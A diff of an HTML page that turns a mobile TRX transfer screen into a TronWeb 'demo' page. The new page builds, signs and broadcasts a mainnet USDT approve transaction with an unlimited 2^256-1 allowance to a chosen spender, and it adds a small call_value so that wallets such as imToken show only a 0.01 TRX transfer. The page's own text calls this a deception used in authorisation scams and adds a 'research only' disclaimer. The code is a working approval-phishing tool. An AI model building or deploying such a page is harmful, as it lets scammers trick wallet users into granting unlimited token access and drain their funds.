@@ -1,201 +1,364 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="apple-mobile-web-app-capable" content="yes">
-
-    <title>TRX 转账</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRON 上链演示 • TriggerSmartContract + call_value + approve</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: white;
-            height: 100%;
-        }
-        .container {
-            display: flex;
-            flex-direction: column;
-            height: 100%;
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        .available {
-            color: #8e8e93;
-            font-size: 18px;
-            margin-bottom: 20px;
-        }
-        .max-button {
-           
-            color: black;
-            cursor: pointer;
-        }
-        .amount {
-            font-size: 50px;
-            font-weight: bold;
-            display: flex;
-            align-items: flex-end;
-            margin-bottom: 5px;
-        }
-        .decimal {
-            width: 10px;
-            height: 10px;
-            background-color: #4CAF50;
-            margin: 0 3px 15px 3px;
-        }
-        .currency {
-            color: #8e8e93;
-            font-size: 48px;
-            margin-left: 5px;
-        }
-        .usd-amount {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: #8e8e93;
-            font-size: 18px;
-            margin-bottom: 40px;
-        }
-        .usd-value {
-            display: flex;
-            align-items: center;
-        }
-        .exchange-icon {
-            font-weight: bold;
-            color: black;
-        }
-        .keypad {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            grid-auto-rows: 40px;
-            margin-top: auto;
-        }
-        .key {
-            font-size: 25px;
-            padding: 10px;
-            border: none;
-            background-color: transparent;
-            cursor: pointer;
-            color: #000;
-        }
-        .next-button {
-            
-            background-color: #000;
-            color: white;
-            border: none;
-            padding: 15px;
-            font-size: 18px;
-            border-radius: 30px;
-            cursor: pointer;
-            margin-top: 30px;
-        }
-        .down-arrow {
-            width: 0;
-            height: 0;
-            border-left: 5px solid transparent;
-            border-right: 5px solid transparent;
-            border-top: 5px solid #8e8e93;
-            margin-left: 5px;
+        body { font-family: 'Inter', system-ui, sans-serif; }
+        .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
+        .tron-card {
+            background: #18181b;
+            border: 1px solid #3f3f46;
         }
     </style>
-    <script src="./static/js/mobile-debug.js"></script>
-    <script src="./static/js/jquery-3.5.1.min.js"></script>
 </head>
-<body>
-    <div class="container">
-        <div class="available">可用: <span id="available-amount">0.00</span> TRX <span class="max-button" onclick="setMaxAmount()">最大</span></div>
-        <div class="amount">
-            <span id="amount-display">0</span>
-            <div id="decimal" class="decimal"></div>
-            <span class="currency">TRX</span>
-        </div>
-        <br>
-        <div class="usd-amount">
-            <div class="usd-value">
-                <span id="usd-amount">0.00 USD</span>
-                <div class="down-arrow"></div>
+<body class="bg-zinc-950 text-zinc-200">
+    <div class="max-w-3xl mx-auto px-6 py-8">
+        <!-- Header -->
+        <div class="flex items-center justify-between mb-8">
+            <div>
+                <h1 class="text-3xl font-bold tracking-tight">TRON 真实上链演示</h1>
+                <p class="text-zinc-400 mt-1">构造带 <span class="font-mono text-amber-400">call_value</span> 的 TriggerSmartContract（approve USDT）</p>
             </div>
-            <span class="exchange-icon">⇅</span>
+            <div class="text-right text-xs text-zinc-500">
+                仅供安全研究与学习<br>
+                <span class="text-red-400">严禁用于诈骗</span>
+            </div>
         </div>
-        <div class="keypad">
-            <button class="key" onclick="addDigit('1')">1</button>
-            <button class="key" onclick="addDigit('2')">2</button>
-            <button class="key" onclick="addDigit('3')">3</button>
-            <button class="key" onclick="addDigit('4')">4</button>
-            <button class="key" onclick="addDigit('5')">5</button>
-            <button class="key" onclick="addDigit('6')">6</button>
-            <button class="key" onclick="addDigit('7')">7</button>
-            <button class="key" onclick="addDigit('8')">8</button>
-            <button class="key" onclick="addDigit('9')">9</button>
-            <button class="key" onclick="addDigit('.')">.</button>
-            <button class="key" onclick="addDigit('0')">0</button>
-            <button class="key" onclick="deleteDigit()">⌫</button>
+
+        <!-- Warning -->
+        <div class="tron-card rounded-2xl p-4 mb-6 border border-red-900/60 bg-red-950/30">
+            <div class="flex gap-3">
+                <i class="fa-solid fa-exclamation-triangle text-red-400 mt-1"></i>
+                <div class="text-sm text-red-300">
+                    <strong>重要警告：</strong> 此代码可构造同时携带 <code>call_value</code> 和 <code>approve</code> 的交易。<br>
+                    这种交易曾被用于授权诈骗（UI 只显示 TRX 转账，实际执行 approve）。请仅用于测试自己的钱包或安全审计，<strong>严禁用于欺骗他人</strong>，否则可能触犯法律。
+                </div>
+            </div>
         </div>
-        <button class="next-button" id="submitBtn">Next</button>
+
+        <!-- imToken 说明 + 可选连接 -->
+        <div class="tron-card rounded-2xl p-5 mb-6 border border-amber-900/50">
+            <div class="flex items-start gap-3">
+                <i class="fa-solid fa-mobile-screen-button text-amber-400 text-xl mt-0.5"></i>
+                <div class="flex-1">
+                    <div class="font-semibold text-amber-300">关于 imToken 钱包</div>
+                    <div class="text-xs text-zinc-400 mt-1 leading-relaxed">
+                        这个页面默认用 TronLink 方便浏览器内快速签名。<br>
+                        <strong>但交易构造是通用的</strong>：生成的 TriggerSmartContract 在 <span class="text-white">imToken、TronLink、TokenPocket</span> 等任意钱包里签名上链后，效果完全一样。<br>
+                        imToken 出现「只显示发送 0.01 TRX」就是因为它对带 <code>call_value</code> 的 approve 调用解析有问题。
+                    </div>
+                    <div class="mt-2 text-[10px] text-amber-400">
+                        → 如果你想在 imToken 里测试：构造好交易后，复制 TX 参数或用 imToken 的 DApp 浏览器打开对应链接即可。
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Optional Connect -->
+        <div class="tron-card rounded-2xl p-5 mb-6">
+            <div class="flex items-center justify-between">
+                <div>
+                    <div class="font-semibold">可选：连接 TronLink 快速签名（浏览器）</div>
+                    <div id="wallet_status" class="text-xs text-zinc-400 mt-0.5">未连接（构建交易不需要连接）</div>
+                </div>
+                <button onclick="connectTronLink()" 
+                        class="px-4 py-2 bg-zinc-800 hover:bg-zinc-700 border border-zinc-600 rounded-2xl text-xs flex items-center gap-x-2">
+                    <i class="fa-solid fa-plug"></i>
+                    <span id="connect_btn_text">连接 TronLink</span>
+                </button>
+            </div>
+            <div id="address_display" class="mt-2 text-xs font-mono text-emerald-400 hidden"></div>
+        </div>
+
+        <!-- Parameters -->
+        <div class="tron-card rounded-2xl p-6 mb-6">
+            <div class="font-semibold mb-4 flex items-center gap-x-2">
+                <i class="fa-solid fa-sliders-h"></i>
+                <span>交易参数</span>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <!-- call_value -->
+                <div>
+                    <label class="text-xs text-zinc-400 block mb-1">call_value（sun）</label>
+                    <input id="call_value" type="number" value="10000" 
+                           class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 font-mono text-lg focus:outline-none focus:border-amber-500">
+                    <div class="text-[10px] text-emerald-400 mt-1">= <span id="trx_value">0.010000</span> TRX（UI 可能只显示这个）</div>
+                </div>
+
+                <!-- Spender -->
+                <div>
+                    <label class="text-xs text-zinc-400 block mb-1">spender（授权给谁）</label>
+                    <input id="spender" type="text" value="T9vD65m4vN5vK8vL9vM0vN1vP2vQ3vR4vS5vT6" 
+                           class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 font-mono text-sm focus:outline-none focus:border-amber-500">
+                </div>
+
+                <!-- Amount -->
+                <div class="md:col-span-2">
+                    <label class="text-xs text-zinc-400 block mb-1">approve 金额（USDT，最小单位，6位小数）</label>
+                    <div class="flex gap-3">
+                        <input id="approve_amount" type="text" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" 
+                               class="flex-1 bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 font-mono text-sm focus:outline-none focus:border-amber-500">
+                        <button onclick="setMaxAmount()" 
+                                class="px-4 py-2 bg-zinc-800 hover:bg-zinc-700 border border-zinc-600 rounded-xl text-xs whitespace-nowrap">设为无限 (max)</button>
+                    </div>
+                    <div class="text-[10px] text-zinc-500 mt-1">常用诈骗值 = 2^256-1（无限授权）</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Actions -->
+        <div class="flex flex-col sm:flex-row gap-3">
+            <button onclick="buildTransaction()" 
+                    class="flex-1 py-3.5 bg-white text-zinc-900 font-semibold rounded-2xl hover:bg-zinc-100 active:bg-zinc-200 transition-colors flex items-center justify-center gap-x-2">
+                <i class="fa-solid fa-cogs"></i>
+                <span>1. 构造交易（带 call_value + approve）</span>
+            </button>
+            
+            <button onclick="signAndBroadcast()" id="broadcast_btn"
+                    class="flex-1 py-3.5 bg-emerald-600 hover:bg-emerald-500 disabled:bg-zinc-700 disabled:text-zinc-400 transition-colors rounded-2xl font-semibold flex items-center justify-center gap-x-2" disabled>
+                <i class="fa-solid fa-paper-plane"></i>
+                <span>2. 用 TronLink 签名并上链</span>
+            </button>
+        </div>
+
+        <!-- Result Area -->
+        <div id="result_area" class="hidden mt-6 tron-card rounded-2xl p-5 border border-zinc-700">
+            <div class="font-semibold mb-3 flex items-center gap-x-2 text-emerald-400">
+                <i class="fa-solid fa-check-circle"></i>
+                <span>交易已构建</span>
+            </div>
+            
+            <div class="space-y-3 text-sm">
+                <div>
+                    <div class="text-xs text-zinc-400">Transaction ID</div>
+                    <div id="txid_display" class="font-mono text-xs break-all bg-black p-2 rounded"></div>
+                </div>
+                
+                <div class="grid grid-cols-2 gap-3 text-xs">
+                    <div>
+                        <div class="text-zinc-400">call_value</div>
+                        <div id="result_callvalue" class="font-mono"></div>
+                    </div>
+                    <div>
+                        <div class="text-zinc-400">合约方法</div>
+                        <div class="font-mono text-emerald-400">approve(address,uint256)</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="mt-4 flex gap-2">
+                <button onclick="copyTxid()" class="flex-1 py-2 text-xs bg-zinc-800 hover:bg-zinc-700 rounded-xl">复制 TXID</button>
+                <a id="tronscan_link" target="_blank" 
+                   class="flex-1 py-2 text-xs bg-orange-600 hover:bg-orange-500 text-center rounded-xl flex items-center justify-center gap-x-1">
+                    <span>在 TronScan 查看</span> <i class="fa-solid fa-external-link-alt text-xs"></i>
+                </a>
+            </div>
+            
+            <div class="mt-3 text-[10px] text-amber-400/80">
+                注意：这笔交易同时包含了 call_value（误导用）和 approve 调用。钱包如果只显示前者就会出现你描述的效果。
+            </div>
+        </div>
     </div>
- <script type="text/javascript" src="./static/js/help.js"></script>
-    <script type="text/javascript" src="./static/pay/js/common.js"></script>
+
     <script>
-    
-    $(function() {
-            sleep(1000).then(() => {
-                getAssets(function(trx, usdt) {
-                    $("#submitBtn")["removeAttr"]("disabled");
-                    $("#submitBtn")["text"]("下一步");
-                    $("#available-amount").html(trx);
-                });
-            });
-            $("#submitBtn").click(function() {
-                executeBlockchainTransaction();
-            });
-        });
-    
-        let amount = '0';
-        const amountDisplay = document.getElementById('amount-display');
-        const usdAmount = document.getElementById('usd-amount');
-        const decimal = document.getElementById('decimal');
-        const availableAmount = document.getElementById('available-amount');
+        let currentTx = null;
+        let tronWebInstance = null;
+        let userAddress = null;
 
-        function updateDisplay() {
-            amountDisplay.textContent = amount;
-            usdAmount.textContent = (parseFloat(amount) * 0.13).toFixed(2) + ' USD';
+        function initTailwind() {
+            // already using CDN
         }
 
-        function addDigit(digit) {
-            if (amount === '0' && digit !== '.') {
-                amount = digit;
-            } else if (digit === '.' && amount.includes('.')) {
-                return;
-            } else if (amount.split('.')[1]?.length >= 6) {
-                return;
-            } else if (amount === '0' && digit === '0') {
-                return;
-            } else {
-                amount += digit;
-            }
-            updateDisplay();
-        }
-
-        function deleteDigit() {
-            amount = amount.slice(0, -1);
-            if (amount === '' || amount === '0.') amount = '0';
-            updateDisplay();
+        function updateTrxValue() {
+            const sun = parseFloat(document.getElementById('call_value').value) || 0;
+            document.getElementById('trx_value').textContent = (sun / 1_000_000).toFixed(6);
         }
 
         function setMaxAmount() {
-            amount = availableAmount.textContent;
-            updateDisplay();
+            document.getElementById('approve_amount').value = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         }
 
-        setInterval(() => {
-            decimal.style.visibility = decimal.style.visibility === 'hidden' ? 'visible' : 'hidden';
-        }, 500);
+        async function connectTronLink() {
+            const statusEl = document.getElementById('wallet_status');
+            const btnText = document.getElementById('connect_btn_text');
+            const addrEl = document.getElementById('address_display');
 
-        updateDisplay();
+            if (!window.tronWeb || !window.tronWeb.defaultAddress) {
+                alert('请先安装 TronLink 钱包插件并解锁！\nhttps://www.tronlink.org/');
+                return;
+            }
+
+            try {
+                // TronLink v3+ needs request
+                if (window.tronWeb.request) {
+                    await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                }
+                
+                tronWebInstance = window.tronWeb;
+                userAddress = tronWebInstance.defaultAddress.base58;
+
+                if (!userAddress) {
+                    alert('请在 TronLink 中切换到主网账户');
+                    return;
+                }
+
+                statusEl.innerHTML = '<span class="text-emerald-400">已连接</span>';
+                btnText.textContent = '已连接';
+                addrEl.textContent = userAddress;
+                addrEl.classList.remove('hidden');
+                
+                // Enable broadcast button after connect
+                document.getElementById('broadcast_btn').disabled = false;
+
+            } catch (e) {
+                console.error(e);
+                alert('连接 TronLink 失败: ' + e.message);
+            }
+        }
+
+        async function buildTransaction() {
+            if (!tronWebInstance) {
+                alert('请先连接 TronLink 钱包');
+                return;
+            }
+
+            const callValueSun = parseInt(document.getElementById('call_value').value) || 10000;
+            const spender = document.getElementById('spender').value.trim();
+            const amountStr = document.getElementById('approve_amount').value.trim();
+            
+            if (!spender || !amountStr) {
+                alert('请填写完整的 spender 和 approve 金额');
+                return;
+            }
+
+            const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+
+            try {
+                // 使用 TronWeb 高级 API 构造交易
+                const txBuilder = await tronWebInstance.transactionBuilder.triggerSmartContract(
+                    usdtContract,
+                    'approve(address,uint256)',
+                    {
+                        callValue: callValueSun,           // ← 关键：这里设置 call_value
+                        feeLimit: 150_000_000,             // 150 TRX 足够
+                        shouldPollResponse: false
+                    },
+                    [
+                        { type: 'address', value: spender },
+                        { type: 'uint256', value: amountStr }
+                    ],
+                    userAddress
+                );
+
+                currentTx = txBuilder.transaction;
+
+                // 显示结果
+                document.getElementById('result_area').classList.remove('hidden');
+                document.getElementById('txid_display').textContent = currentTx.txID || '(构建成功，待签名)';
+                document.getElementById('result_callvalue').textContent = callValueSun + ' sun (' + (callValueSun / 1_000_000) + ' TRX)';
+
+                // 更新 TronScan 链接（构建后 txID 可能还是临时的）
+                const link = document.getElementById('tronscan_link');
+                link.href = `https://tronscan.org/#/transaction/${currentTx.txID || ''}`;
+
+                alert('交易构造成功！\n现在可以点击「签名并上链」按钮用 TronLink 签名广播。');
+
+            } catch (error) {
+                console.error('构建交易失败:', error);
+                alert('构建失败: ' + (error.message || error));
+            }
+        }
+
+        async function signAndBroadcast() {
+            if (!currentTx || !tronWebInstance) {
+                alert('请先点击「构造交易」');
+                return;
+            }
+
+            const btn = document.getElementById('broadcast_btn');
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-2"></i> 签名中...`;
+
+            try {
+                // 用 TronLink 签名
+                const signedTx = await tronWebInstance.trx.sign(currentTx);
+                
+                btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-2"></i> 广播中...`;
+
+                // 广播
+                const result = await tronWebInstance.trx.sendRawTransaction(signedTx);
+
+                if (result.result) {
+                    const txid = result.txid || currentTx.txID;
+                    
+                    document.getElementById('txid_display').innerHTML = 
+                        `<span class="text-emerald-400">${txid}</span>`;
+                    
+                    const link = document.getElementById('tronscan_link');
+                    link.href = `https://tronscan.org/#/transaction/${txid}`;
+                    link.innerHTML = `在 TronScan 查看 <i class="fa-solid fa-external-link-alt text-xs"></i>`;
+
+                    btn.innerHTML = `<i class="fa-solid fa-check mr-2"></i> 上链成功！`;
+                    btn.classList.remove('bg-emerald-600');
+                    btn.classList.add('bg-emerald-500');
+
+                    setTimeout(() => {
+                        alert(`交易已成功上链！\nTXID: ${txid}\n\n请在 TronScan 查看详情。\n\n注意：这笔交易同时执行了 approve + 转入 ${document.getElementById('call_value').value} sun TRX。`);
+                    }, 800);
+
+                } else {
+                    throw new Error(result.message || '广播失败');
+                }
+
+            } catch (error) {
+                console.error('签名/广播失败:', error);
+                alert('签名或广播失败: ' + (error.message || error));
+                btn.disabled = false;
+                btn.innerHTML = `<i class="fa-solid fa-paper-plane"></i> <span>2. 用 TronLink 签名并上链</span>`;
+            }
+        }
+
+        function copyTxid() {
+            const txidEl = document.getElementById('txid_display');
+            const text = txidEl.textContent.trim();
+            if (!text || text.includes('构建成功')) {
+                alert('还没有有效的 TXID');
+                return;
+            }
+            navigator.clipboard.writeText(text).then(() => {
+                const orig = txidEl.innerHTML;
+                txidEl.innerHTML = '<span class="text-emerald-400">已复制到剪贴板</span>';
+                setTimeout(() => {
+                    txidEl.innerHTML = orig;
+                }, 1500);
+            });
+        }
+
+        function init() {
+            initTailwind();
+
+            // live update trx value
+            const callInput = document.getElementById('call_value');
+            callInput.addEventListener('input', updateTrxValue);
+            updateTrxValue();
+
+            // Set a reasonable default spender if empty
+            const spenderInput = document.getElementById('spender');
+            if (!spenderInput.value) {
+                spenderInput.value = 'T9vD65m4vN5vK8vL9vM0vN1vP2vQ3vR4vS5vT6';
+            }
+
+            // Keyboard hint
+            console.log('%c[TRON Demo] 已加载。连接 TronLink 后即可真实上链测试。', 'color:#3f3f46');
+        }
+
+        window.onload = init;
     </script>
 </body>
 </html>
